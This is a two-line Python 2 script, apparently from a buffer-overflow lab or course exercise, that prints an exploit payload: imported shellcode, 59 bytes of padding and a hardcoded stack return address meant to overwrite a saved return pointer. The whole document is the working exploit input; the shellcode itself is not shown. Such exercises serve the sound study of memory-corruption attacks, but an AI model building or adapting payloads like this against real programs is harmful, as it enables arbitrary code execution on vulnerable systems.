from shellcode import shellcode
print shellcode + "\xAA"*59 + "\x4c\xfb\xfe\xbf"
